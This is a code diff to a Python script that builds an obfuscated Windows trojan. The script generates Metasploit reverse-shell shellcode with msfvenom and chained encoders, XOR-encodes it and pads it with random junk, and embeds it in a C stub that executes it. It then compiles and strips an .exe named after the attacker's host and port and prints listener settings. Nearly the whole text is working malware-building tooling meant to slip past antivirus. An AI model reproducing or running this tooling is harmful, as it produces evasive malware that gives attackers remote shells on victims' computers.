@@ -5,7 +5,7 @@ from   tempfile import mkstemp
 import os
 import commands
 import subprocess
-import random 
+import random
 import socket
 os.system("clear")
 
@@ -18,6 +18,9 @@ structure_contents = """
 #include <time.h>
 
 int main(){
+
+
+
 char jA []= %s;
 unsigned char pl[] = %s;
 char jB []= %s;
@@ -63,7 +66,7 @@ for(i=0; i<P_L/2; i++)
     }
 }
 
-((void (*)())exec)();
+((void (*    )())     exec   )();
 
 return 1;
 }
@@ -137,13 +140,13 @@ randomSize = random.randint(20480,25600)
 #Generating junk A
 junkA = "\""
 for i in xrange(1,randomSize):
-	junkA += chr(random.randint(65,90)) 
+	junkA += chr(random.randint(65,90))
 junkA +=  "\""
 
 #Generating junk B
 junkB = "\""
 for i in xrange(0,randomSize):
-	junkB += chr(random.randint(65,90)) 
+	junkB += chr(random.randint(65,90))
 junkB +=  "\""
 
 msf_payloads = [
@@ -159,9 +162,11 @@ r'windows/meterpreter/reverse_https',
 
 #Generating shellcode through metasploit
 print "[*] Generating metasploit shellcode..."
-os.system("msfpayload "+ msf_payloads[option] +" LHOST=%s LPORT=%s R | msfencode -t raw -e x86/shikata_ga_nai -c 8 | msfencode -t raw -e x86/alpha_upper -c 2 | msfencode -t raw -o %s -e x86/countdown -c 4" % (lhost,lport,payload_raw))
+os.system("msfvenom -a x86 --platform windows -p %s LHOST=%s LPORT=%s -e x86/shikata_ga_nai -i 8 -f raw | msfvenom -a x86 --platform windows -f raw -e x86/alpha_upper -i 2 | msfvenom -a x86 --platform windows -f raw -o %s -e x86/countdown -i 4" % (msf_payloads[option], lhost,lport,payload_raw))
+#os.system("msfvenom -a x86 --platform windows -p windows/exec  CMD=notepad.exe  -e x86/shikata_ga_nai -i 8 -f raw -o %s " % (payload_raw) )
 
-print "[*] Encoding with XOR key: ", hex(key) 
+
+print "[*] Encoding with XOR key: ", hex(key)
 print "[*] Obfuscating shellcode..."
 a                    = open(payload_raw,"rb")
 b                    = open(out,"w")
@@ -178,7 +183,7 @@ for i in xrange(0,length):
 		x += 1
 	else:
 		randomByte = random.randint(65,90)
-		tempArray.append(randomByte)	
+		tempArray.append(randomByte)
 for i in range(0,len(tempArray)):
 	tempArray[i]="\\x%x"%tempArray[i]
 for i in range(0,len(tempArray),15):
@@ -194,11 +199,12 @@ b.flush()
 
 #Compiling code and striping out debugging symbols
 print "[*] Compiling trojan horse..."
-os.system("i586-mingw32msvc-gcc -mwindows %s" % out)
+#os.system("i586-mingw32msvc-gcc -mwindows %s" % out)
+os.system("i686-w64-mingw32-gcc -mwindows %s" % out)
 print "[*] Stripping out the debugging symbols..."
 os.system("strip --strip-debug a.exe")
 
-file_output = lhost +'_'+ lport +'.exe' 
+file_output = lhost +'_'+ lport +'.exe'
 os.system("mv a.exe " + file_output   )
 
 #Telling people how to live their life
@@ -208,10 +214,11 @@ print "[*]     set PAYLOAD "  + msf_payloads[option]
 print "[*]     set LHOST "    +lhost
 print "[*]     set LPORT "    +lport
 print "[*]     set TARGET 0"
-print "[*]     Created file " + file_output + "."
+print "[*]     Created file: " + file_output
 
 #Deleting temporary files
 os.unlink(out)
 os.unlink(payload_raw)
 os.unlink(structure)
 print "[*] Done !"
+
